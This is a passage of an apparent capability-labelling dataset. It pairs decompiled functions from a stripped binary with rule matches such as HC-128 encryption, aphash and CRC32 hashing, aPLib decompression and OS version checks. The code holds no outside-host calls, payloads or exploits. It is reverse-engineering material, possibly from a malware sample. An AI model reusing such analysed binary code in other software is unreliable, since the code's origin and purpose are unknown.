iVar4);\n            }\n            return 0xc0000001;\n        }\n        iVar4 = iVar4 + 1;\n        if (4 < iVar4) {\n            fcn.0002ed80(0x7b790);\n            *0x7b7a0 = 0;\n            *0x7b7a8 = 0;\n            *0x7b7f0 = 0;\n            *0x7b7f8 = 0;\n            *0x7b798 = 0;\n            *0x7b800 = 0;\n            *0x7b7d8 = 0;\n            *0x7b7e0 = 0;\n            fcn.0001a650(0x7b808, 0x43f00, 0);\n            fcn.0001a650(0x7b860, 0x43ddc, *0x7b7d0);\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 695
    },
    "0005588c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.0005588c(int64_t arg1, ulong arg2, uchar *arg3)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    iVar7 = 0;\n    iVar9 = 0;\n    iVar5 = 0;\n    iVar4 = 0;\n    iVar6 = 0;\n    *arg3 = 0;\n    if (0 < arg2) {\n        do {\n            iVar2 = fcn.00061a86(0x15e80, *(iVar4 + arg1));\n            if (iVar2 != 0) {\n                uVar1 = iVar2 + 0x80;\n                if (0x1f < uVar1) {\n                    uVar1 = 0x1f;\n                }\n                iVar3 = 0;\n                do {\n                    iVar8 = iVar9 + 1;\n                    arg3[iVar6] = arg3[iVar6] | ((1 << (iVar3 & 0x1f) & uVar1) >> (iVar3 & 0x1f)) << (iVar9 & 0x1f);\n                    iVar9 = iVar8;\n                    if ((7 < iVar8) && (iVar9 = 0,  iVar5 < arg2 + -1)) {\n                        iVar7 = iVar7 + 1;\n                        iVar6 = iVar6 + 1;\n                        arg3[iVar6] = 0;\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 5);\n            }\n            iVar4 = iVar4 + 1;\n            iVar5 = iVar5 + 1;\n        } while (iVar4 < arg2);\n    }\n    return iVar7 + 1;\n}\n",
        "token_count": 423
    },
    "0002bc38": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.0002bc38(uint8_t *arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint8_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint8_t *puStack96;\n    uint8_t *puStack88;\n    \n    uVar2 = 0;\n    if (in_stack_00000030 == 0) {\n        iVar3 = arg3 - 8;\n        uVar1 = *in_stack_00000028 << 0x18 | in_stack_00000028[1] << 0x10 | in_stack_00000028[2] << 8 |\n                in_stack_00000028[3];\n        uVar2 = in_stack_00000028[4] << 0x18 | in_stack_00000028[5] << 0x10 | in_stack_00000028[6] << 8 |\n                in_stack_00000028[7];\n        puStack88 = in_stack_00000028;\n        if (-1 < iVar3) {\n            uVar9 = arg3 >> 3;\n            iVar3 = iVar3 + (arg3 >> 3) * -8;\n            uVar8 = uVar1;\n            uVar10 = uVar2;\n            puStack96 = uVar9;\n            do {\n                puVar4 = arg1 + 4;\n                uVar1 = *arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3];\n                puVar5 = arg1 + 5;\n                puVar6 = arg1 + 6;\n                puVar7 = arg1 + 7;\n                arg1 = arg1 + 8;\n                uVar2 = *puVar4 << 0x18 | *puVar5 << 0x10 | *puVar6 << 8 | *puVar7;\n                uStack104 = uVar1;\n                uStack100 = uVar2;\n                fcn.0002b72c(&uStack104, arg4);\n                uVar8 = uVar8 ^ uStack104;\n                uVar10 = uVar10 ^ uStack100;\n                *arg2 = uVar8 >> 0x18;\n                arg2[1] = uVar8 >> 0x10;\n                arg2[2] = uVar8 >> 8;\n                arg2[3] = uVar8;\n                arg2[4] = uVar10 >> 0x18;\n                arg2[5] = uVar10 >> 0x10;\n                arg2[6] = uVar10 >> 8;\n                arg2[7] = uVar10;\n                arg2 = arg2 + 8;\n                uVar9 = uVar9 - 1;\n                in_stack_00000028 = puStack88;\n                uVar8 = uVar1;\n                uVar10 = uVar2;\n            } while (uVar9 != 0);\n        }\n        uVar8 = uVar1;\n        uVar10 = uVar2;\n        if (iVar3 != -8) {\n            uVar8 = *arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3];\n            uVar10 = arg1[4] << 0x18 | arg1[5] << 0x10 | CONCAT11(arg1[6], arg1[7]);\n            uStack104 = uVar8;\n            uStack100 = uVar10;\n            fcn.0002b72c(&uStack104, arg4);\n            uVar1 = uVar1 ^ uStack104;\n            uVar2 = uVar2 ^ uStack100;\n            arg2 = arg2 + (iVar3 + 8);\n            if (iVar3 != -7) {\n                if (iVar3 != -6) {\n                    if (iVar3 != -5) {\n                        if (iVar3 != -4) {\n                            if (iVar3 != -3) {\n                                if (iVar3 != -2) {\n                                    if (iVar3 != -1) {\n                                        if (iVar3 != 0) goto code_r0x0002c1e1;\n                                        arg2 = arg2 + -1;\n                                        *arg2 = uVar2;\n                                    }\n                                    arg2 = arg2 + -1;\n                                    *arg2 = uVar2 >> 8;\n                                }\n                                arg2 = arg2 + -1;\n                                *arg2 = uVar2 >> 0x10;\n                            }\n                            arg2 = arg2 + -1;\n                            *arg2 = uVar2 >> 0x18;\n                        }\n                        arg2 = arg2 + -1;\n                        *arg2 = uVar1;\n                    }\n                    arg2 = arg2 + -1;\n                    *arg2 = uVar1 >> 8;\n                }\n                arg2 = arg2 + -1;\n                *arg2 = uVar1 >> 0x10;\n            }\n            arg2[-1] = uVar1 >> 0x18;\n        }\ncode_r0x0002c1e1:\n        *in_stack_00000028 = uVar8 >> 0x18;\n        in_stack_00000028[1] = uVar8 >> 0x10;\n        in_stack_00000028[2] = uVar8 >> 8;\n        in_stack_00000028[3] = uVar8;\n        in_stack_00000028[4] = uVar10 >> 0x18;\n        in_stack_00000028[5] = uVar10 >> 0x10;\n        in_stack_00000028[6] = uVar10 >> 8;\n        in_stack_00000028[7] = uVar10;\n        return;\n    }\n    iVar3 = arg3 - 8;\n    uStack104 = *in_stack_00000028 << 0x18 | in_stack_00000028[1] << 0x10 | in_stack_00000028[2] << 8 |\n                in_stack_00000028[3];\n    uStack100 = in_stack_00000028[4] << 0x18 | in_stack_00000028[5] << 0x10 | in_stack_00000028[6] << 8 |\n                in_stack_00000028[7];\n    puStack96 = in_stack_00000028;\n    if (-1 < iVar3) {\n        uVar9 = arg3 >> 3;\n        iVar3 = iVar3 + (arg3 >> 3) * -8;\n        do {\n            puVar4 = arg1 + 4;\n            puVar5 = arg1 + 5;\n            puVar6 = arg1 + 6;\n            uStack104 = (*arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3]) ^ uStack104;\n            puVar7 = arg1 + 7;\n            arg1 = arg1 + 8;\n            uStack100 = (*puVar4 << 0x18 | *puVar5 << 0x10 | *puVar6 << 8 | *puVar7) ^ uStack100;\n            fcn.0002b22c(&uStack104, arg4);\n            *arg2 = uStack104 >> 0x18;\n            arg2[1] = uStack104 >> 0x10;\n            arg2[2] = uStack104 >> 8;\n            arg2[3] = uStack104;\n            arg2[4] = uStack100 >> 0x18;\n            arg2[5] = uStack100 >> 0x10;\n            arg2[6] = uStack100 >> 8;\n            arg2[7] = uStack100;\n            arg2 = arg2 + 8;\n            uVar9 = uVar9 - 1;\n            in_stack_00000028 = puStack96;\n        } while (uVar9 != 0);\n    }\n    if (iVar3 == -8) goto code_r0x0002bef6;\n    uVar1 = 0;\n    arg1 = arg1 + (iVar3 + 8);\n    if (iVar3 == -7) {\ncode_r0x0002be72:\n        uVar1 = uVar1 | arg1[-1] << 0x18;\n    }\n    else {\n        if (iVar3 == -6) {\ncode_r0x0002be65:\n            arg1 = arg1 + -1;\n            uVar1 = uVar1 | *arg1 << 0x10;\n            goto code_r0x0002be72;\n        }\n        if (iVar3 == -5) {\ncode_r0x0002be58:\n            arg1 = arg1 + -1;\n            uVar1 = uVar1 | *arg1 << 8;\n            goto code_r0x0002be65;\n        }\n        if (iVar3 == -4) {\ncode_r0x0002be50:\n            arg1 = arg1 + -1;\n            uVar1 = *arg1;\n            goto code_r0x0002be58;\n        }\n        if (iVar3 == -3) {\ncode_r0x0002be43:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 0x18;\n            goto code_r0x0002be50;\n        }\n        if (iVar3 == -2) {\ncode_r0x0002be36:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 0x10;\n            goto code_r0x0002be43;\n        }\n        if (iVar3 == -1) {\ncode_r0x0002be29:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 8;\n            goto code_r0x0002be36;\n        }\n        if (iVar3 == 0) {\n            arg1 = arg1 + -1;\n            uVar2 = *arg1;\n            goto code_r0x0002be29;\n        }\n    }\n    uStack104 = uVar1 ^ uStack104;\n    uStack100 = uVar2 ^ uStack100;\n    fcn.0002b22c(&uStack104, arg4);\n    *arg2 = uStack104 >> 0x18;\n    arg2[1] = uStack104 >> 0x10;\n    arg2[2] = uStack104 >> 8;\n    arg2[3] = uStack104;\n    arg2[4] = uStack100 >> 0x18;\n    arg2[5] = uStack100 >> 0x10;\n    arg2[6] = uStack100 >> 8;\n    arg2[7] = uStack100;\ncode_r0x0002bef6:\n    *in_stack_00000028 = uStack104 >> 0x18;\n    in_stack_00000028[1] = uStack104 >> 0x10;\n    in_stack_00000028[2] = uStack104 >> 8;\n    in_stack_00000028[3] = uStack104;\n    in_stack_00000028[4] = uStack100 >> 0x18;\n    in_stack_00000028[5] = uStack100 >> 0x10;\n    in_stack_00000028[6] = uStack100 >> 8;\n    in_stack_00000028[7] = uStack100;\n    return;\n}\n",
        "token_count": 2666
    },
    "00031df4": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nulong fcn.00031df4(int16_t *arg1, ulong arg2, ulong arg3)\n\n{\n    char *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    char cVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int16_t *piVar8;\n    uint64_t uVar9;\n    char acStack312 [280];\n    \n    iVar6 = -1;\n    piVar8 = arg1;\n    do {\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        iVar2 = *piVar8;\n        piVar8 = piVar8 + 1;\n    } while (iVar2 != 0);\n    uVar7 = 0;\n    uVar3 = ~iVar6;\n    if (uVar3 - 9 < 0xfa) {\n        fcn.0003179c(arg1, acStack312, 0x104);\n        iVar6 = uVar3 - 1;\n        uVar9 = uVar7;\n        if (0 < iVar6) {\n            do {\n                pcVar1 = acStack312 + uVar7;\n                uVar7 = uVar7 + 1;\n                uVar9 = uVar9 + *pcVar1;\n            } while (uVar7 < iVar6);\n        }\n        cVar4 = (uVar9 & 0xff) / 0x1a;\n        acStack312[iVar6] = cVar4 + 'a';\n        acStack312[iVar6 + 1] = (cVar4 * '\\x1a' - (uVar9 & 0xff)) + 'z';\n        fcn.00031740(acStack312 + iVar6, arg2, 2);\n        fcn.00031740(acStack312 + uVar3, arg3, 2);\n        uVar5 = 1;\n    }\n    else {\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 448
    },
    "0002f490": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nulong fcn.0002f490(ulong arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    uint32_t auStackX16 [6];\n    \n    arg1_01 = 0x4000;\n    if (arg2 == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        while( true ) {\n            arg1_00 = fcn.0002fbc4(arg1_01);\n            if (arg1_00 == 0) break;\n            uVar1 = fcn.00061b52(arg1, arg1_00, arg1_01, auStackX16);\n            if (uVar1 != -0x3ffffffc) {\n                if (uVar1 == 0) {\n                    *arg2 = arg1_00;\n                    return uVar1;\n                }\n                fcn.0002fc50(arg1_00);\n                return 0xffffffff;\n            }\n            fcn.0002fc50(arg1_00);\n            if ((arg1 == 6) || (arg1 == 0xb)) {\n                arg1_01 = auStackX16[0];\n            }\n            else {\n                arg1_01 = arg1_01 * 2;\n            }\n        }\n        uVar1 = 0x21590004;\n    }\n    return uVar1;\n}\n",
        "token_count": 318
    },
    "00035160": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00035160(uint64_t arg1, uint32_t *arg2, int16_t *arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    bool bVar4;\n    uchar auStackX24 [16];\n    \n    arg1 = arg1 & 0xffffffff;\n    iVar1 = fcn.0002fd20();\n    if (*arg3 != iVar1) {\n        return;\n    }\n    iVar1 = fcn.0002fd20();\n    if (arg3[1] != iVar1) {\n        return;\n    }\n    if (*(arg3 + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg3 + 5) == '\\x04') {\n        iVar1 = fcn.0002fd20();\n        if (arg3[3] == iVar1) {\n            bVar4 = *arg2 < *0x64f20;\n            if ((*arg2 == *0x64f20) && (bVar4 = *(arg2 + 1) < *0x64f24,  *(arg2 + 1) == *0x64f24)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = (1 - bVar4) - (bVar4 != 0);\n            }\n            if (iVar2 == 0) {\n                fcn.00031564(0x7b290, auStackX24, 0);\n                iVar3 = fcn.00036bf8(arg1, 1);\n                if (iVar3 != 0) {\n                    bVar4 = *(arg2 + 6) < *(iVar3 + 0x14);\n                    if ((*(arg2 + 6) == *(iVar3 + 0x14)) &&\n                       (bVar4 = *(arg2 + 10) < *(iVar3 + 0x18),  *(arg2 + 10) == *(iVar3 + 0x18))) {\n                        iVar2 = 0;\n                    }\n                    else {\n                        iVar2 = (1 - bVar4) - (bVar4 != 0);\n                    }\n                    if (iVar2 != 0) {\n                        fcn.00041354(arg1, arg3 + 4, *(arg3 + 7));\n                        fcn.00041354(arg1, 0, *(arg3 + 0xc));\n                    }\n                }\n                fcn.00031598(0x7b290, auStackX24, 0);\n                return;\n            }\n        }\n        iVar1 = fcn.0002fd20();\n        if (arg3[3] == iVar1) {\n            fcn.00041354(arg1, arg3 + 4, *(arg3 + 7));\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 619
    },
    "00042528": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00042528(uint64_t arg1, uint32_t *arg2, int16_t *arg3)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    bool bVar5;\n    \n    arg1 = arg1 & 0xffffffff;\n    iVar2 = fcn.0002fd20();\n    if (*arg3 != iVar2) {\n        return;\n    }\n    iVar2 = fcn.0002fd20();\n    if (arg3[1] != iVar2) {\n        return;\n    }\n    if (*(arg3 + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg3 + 5) != '\\x04') {\n        return;\n    }\n    iVar2 = fcn.0002fd20();\n    if (arg3[3] == iVar2) {\n        bVar5 = *arg2 < *0x66218;\n        if ((*arg2 == *0x66218) && (bVar5 = *(arg2 + 1) < *0x6621c,  *(arg2 + 1) == *0x6621c)) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = (1 - bVar5) - (bVar5 != 0);\n        }\n        if (iVar3 == 0) {\n            iVar4 = fcn.00036bf8(arg1, 0);\n            bVar5 = *(arg2 + 6) < *(iVar4 + 0x14);\n            if ((*(arg2 + 6) == *(iVar4 + 0x14)) &&\n               (bVar5 = *(arg2 + 10) < *(iVar4 + 0x18),  *(arg2 + 10) == *(iVar4 + 0x18))) {\n                iVar3 = 0;\n            }\n            else {\n                iVar3 = (1 - bVar5) - (bVar5 != 0);\n            }\n            if (iVar3 == 0) {\n                return;\n            }\n            fcn.00041354(arg1, arg3 + 4, *(arg3 + 7));\n            uVar1 = *(arg3 + 0xc);\n            arg3 = NULL;\n            goto code_r0x000425fd;\n        }\n    }\n    iVar2 = fcn.0002fd20();\n    if (arg3[3] != iVar2) {\n        return;\n    }\n    uVar1 = *(arg3 + 7);\n    arg3 = arg3 + 4;\ncode_r0x000425fd:\n    fcn.00041354(arg1, arg3, uVar1);\n    return;\n}\n",
        "token_count": 595
    },
    "00046294": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint64_t * fcn.00046294(uint64_t arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uint8_t uVar2;\n    int64_t *piVar3;\n    int64_t *arg1_00;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    \n    piVar5 = NULL;\n    uVar6 = (arg1 & 0xffffffff) >> 5 & 0xfff;\n    if (arg1 == 0) {\n        return 0xc00000ef;\n    }\n    uVar2 = (**0x113d0)(0x87c80);\n    iVar1 = *0x7b8b0;\n    arg1_00 = *(*0x7b8b0 + uVar6 * 8);\n    piVar4 = piVar5;\n    if (arg1_00 != NULL) {\n        do {\n            piVar3 = arg1_00;\n            arg1_00 = piVar3;\n            if (piVar3[6] == arg1) break;\n            arg1_00 = *piVar3;\n            piVar4 = piVar3;\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (arg2 != NULL) {\n                *arg2 = *(arg1_00 + 8);\n            }\n            if (piVar4 == NULL) {\n                *(iVar1 + uVar6 * 8) = *arg1_00;\n            }\n            else {\n                *piVar4 = *arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            goto code_r0x0004631f;\n        }\n    }\n    piVar5 = 0xc0000034;\ncode_r0x0004631f:\n    (**0x113c0)(0x87c80, piVar4 & 0xffffffffffffff00 | uVar2);\n    return piVar5;\n}\n",
        "token_count": 443
    },
    "0004633c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint64_t * fcn.0004633c(uint64_t arg1, uchar *arg2)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if ((arg1 == 0) || (*0x7b8b0 == 0)) {\n        piVar2 = NULL;\n    }\n    else {\n        iVar3 = *0x7b8b0;\n        if (arg2 != NULL) {\n            uVar1 = (**0x113d0)(0x87c80);\n            iVar3 = *0x7b8b0;\n            *arg2 = uVar1;\n        }\n        piVar2 = *(iVar3 + ((arg1 & 0xffffffff) >> 5 & 0xfff) * 8);\n        if (piVar2 != NULL) {\n            do {\n                if (piVar2[6] == arg1) break;\n                piVar2 = *piVar2;\n            } while (piVar2 != NULL);\n            if (piVar2 != NULL) {\n                return piVar2;\n            }\n        }\n        if (arg2 != NULL) {\n            (**0x113c0)(0x87c80, *arg2);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 281
    },
    "00058e7c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong * fcn.00058e7c(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uint64_t uVar2;\n    \n    uVar2 = (arg1 >> 5) + arg2 & 0x3f;\n    puVar1 = fcn.0002fbc4(0x18);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        puVar1[2] = 0;\n        puVar1[1] = arg1;\n        *(puVar1 + 2) = arg2;\n        fcn.0002f23c(0x87c10);\n        *puVar1 = *(uVar2 * 8 + 0x87a10);\n        *(uVar2 * 8 + 0x87a10) = puVar1;\n        fcn.0002f2a4(0x87c10);\n        puVar1 = 0x1;\n    }\n    return puVar1;\n}\n",
        "token_count": 226
    },
    "00058ef0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong * fcn.00058ef0(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong *arg1_00;\n    ulong *puVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    \n    puVar2 = NULL;\n    uVar3 = (arg1 >> 5) + arg2 & 0x3f;\n    fcn.0002f23c(0x87c10);\n    puVar1 = *(uVar3 * 8 + 0x87a10);\n    puVar4 = puVar2;\n    do {\n        arg1_00 = puVar1;\n        if (arg1_00 == NULL) {\ncode_r0x00058f59:\n            fcn.0002f2a4(0x87c10);\n            return puVar2;\n        }\n        if ((arg1_00[1] == arg1) && (*(arg1_00 + 2) == arg2)) {\n            if (puVar4 == NULL) {\n                *(uVar3 * 8 + 0x87a10) = *arg1_00;\n            }\n            else {\n                *puVar4 = *arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            puVar2 = 0x1;\n            goto code_r0x00058f59;\n        }\n        puVar1 = *arg1_00;\n        puVar4 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 336
    },
    "00058f70": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong fcn.00058f70(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    \n    uVar2 = 0;\n    fcn.0002f23c(0x87c10);\n    puVar1 = *(((arg1 >> 5) + arg2 & 0x3f) * 8 + 0x87a10);\n    do {\n        if (puVar1 == NULL) {\ncode_r0x00058fbe:\n            fcn.0002f2a4(0x87c10);\n            return uVar2;\n        }\n        if ((puVar1[1] == arg1) && (*(puVar1 + 2) == arg2)) {\n            uVar2 = 1;\n            goto code_r0x00058fbe;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 202
    },
    "0003e8b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.0003e8b0(ulong *arg1, uint64_t *arg2, uchar *arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uchar uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    char *pcVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    ulong uStack585;\n    uchar auStack577 [513];\n    uchar auStack64 [16];\n    \n    if ((arg4 == 0) && ((*(arg2 + 6) & 2) != 0)) {\n        iVar5 = fcn.00061a9e();\n        uVar7 = iVar5 >> 0x1f & 0x1f;\n        uVar7 = (iVar5 + uVar7 & 0x1f) - uVar7;\n        arg4 = uVar7 * 8;\n        arg3 = auStack64 + -arg4;\n        puVar8 = arg3;\n        uVar12 = arg4;\n        if ((uVar7 & 0x1fffffff) != 0) {\n            do {\n                uVar3 = fcn.00061a9e();\n                *puVar8 = uVar3;\n                uVar12 = uVar12 - 1;\n                puVar8 = puVar8 + 1;\n            } while (uVar12 != 0);\n        }\n    }\n    uVar11 = 0x15730;\n    if ((*(arg1 + 0x17c) & 1) != 0) {\n        uVar11 = 0x156d0;\n    }\n    fcn.00061b10(&uStack585 + 1, 0x156f8, arg4 + 8, uVar11);\n    uVar12 = 0xffffffffffffffff;\n    pcVar9 = &uStack585 + 1;\n    do {\n        if (uVar12 == 0) break;\n        uVar12 = uVar12 - 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = *arg2;\n    uVar12 = ~uVar12;\n    iVar10 = uVar12 - 1;\n    *(&uStack585 + uVar12) = uVar2;\n    uVar6 = fcn.0002fcf4(uVar2 & 0xffffffff);\n    *(&uStack585 + uVar12) = uVar6;\n    uVar4 = fcn.0002fd20(*(&uStack585 + uVar12 + 4));\n    *(&uStack585 + uVar12 + 4) = uVar4;\n    if ((arg4 != 0) && (arg4 < 0x200U - iVar10)) {\n        fcn.00061a2c(auStack577 + uVar12, arg3, arg4);\n        iVar10 = iVar10 + arg4;\n        arg4 = 0;\n    }\n    uVar11 = fcn.00045e34(*arg1, arg1[1], &uStack585 + 1, iVar10 + 8);\n    if ((uVar11 == 0) && ((arg4 == 0 || (uVar11 = fcn.00045e34(*arg1, arg1[1], arg3, arg4),  uVar11 == 0)))) {\n        uVar11 = 0;\n    }\n    return uVar11;\n}\n",
        "token_count": 811
    },
    "00054ba4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00054ba4(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint64_t in_R9;\n    \n    arg1_00 = arg1 + 0x28;\n    if ((in_R9 & 1) == 0) {\n        fcn.0002f23c(arg1_00);\n    }\n    else {\n        iVar1 = fcn.0002f260(arg1_00);\n        if (iVar1 == 0) {\n            return 0x21590002;\n        }\n    }\n    uVar2 = fcn.0005488c(arg1, arg2, arg3, 0);\n    fcn.0002f2a4(arg1_00);\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "000411c4": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint64_t fcn.000411c4(int16_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int16_t *apiStackX8 [4];\n    \n    apiStackX8[0] = arg1;\n    uVar4 = fcn.000301cc(arg1, apiStackX8, 10);\n    uVar3 = uVar4;\n    if (*apiStackX8[0] == 0x2e) {\n        apiStackX8[0] = apiStackX8[0] + 1;\n        uVar4 = fcn.000301cc(apiStackX8[0], apiStackX8, 10);\n        uVar1 = uVar4;\n        if (*apiStackX8[0] == 0x2e) {\n            apiStackX8[0] = apiStackX8[0] + 1;\n            uVar4 = fcn.000301cc(apiStackX8[0], apiStackX8, 10);\n            uVar2 = uVar4;\n            if (*apiStackX8[0] == 0x2e) {\n                apiStackX8[0] = apiStackX8[0] + 1;\n                uVar4 = fcn.000301cc(apiStackX8[0], 0, 10);\n                if ((((uVar3 < 0x100) && (uVar1 < 0x100)) && (uVar2 < 0x100)) && (uVar4 < 0x100)) {\n                    uVar3 = ((uVar4 << 8 | uVar2) << 8 | uVar1) << 8 | uVar3;\n                    *arg2 = uVar3;\n                    return CONCAT71(uVar3 >> 8, 1);\n                }\n            }\n        }\n    }\n    return uVar4 & 0xffffffffffffff00;\n}\n",
        "token_count": 445
    },
    "0004f39c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.0004f39c(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    \n    uVar1 = fcn.0004f30c(arg1);\n    uVar2 = fcn.0004f30c(arg1);\n    return uVar2 << 8 | arg1 & 0xffff0000 | uVar1;\n}\n",
        "token_count": 90
    },
    "0004f3c8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint fcn.0004f3c8(ulong arg1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uchar uVar4;\n    \n    uVar1 = fcn.0004f30c(arg1);\n    uVar2 = fcn.0004f30c(arg1);\n    uVar3 = fcn.0004f30c(arg1);\n    uVar4 = fcn.0004f30c(arg1);\n    return CONCAT13(uVar4, CONCAT12(uVar3, CONCAT11(uVar2, uVar1)));\n}\n",
        "token_count": 131
    },
    "0004f418": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nulong fcn.0004f418(ulong arg1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uchar uVar4;\n    uchar uVar5;\n    uchar uVar6;\n    uchar uVar7;\n    uchar uVar8;\n    \n    uVar1 = fcn.0004f30c(arg1);\n    uVar2 = fcn.0004f30c(arg1);\n    uVar3 = fcn.0004f30c(arg1);\n    uVar4 = fcn.0004f30c(arg1);\n    uVar5 = fcn.0004f30c(arg1);\n    uVar6 = fcn.0004f30c(arg1);\n    uVar7 = fcn.0004f30c(arg1);\n    uVar8 = fcn.0004f30c(arg1);\n    return CONCAT17(uVar8, CONCAT16(uVar7, CONCAT15(uVar6, CONCAT14(uVar5, CONCAT13(uVar4, CONCAT12(uVar3, CONCAT11(\n                                                            uVar2, uVar1)))))));\n}\n",
        "token_count": 244
    },
    "00061484": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
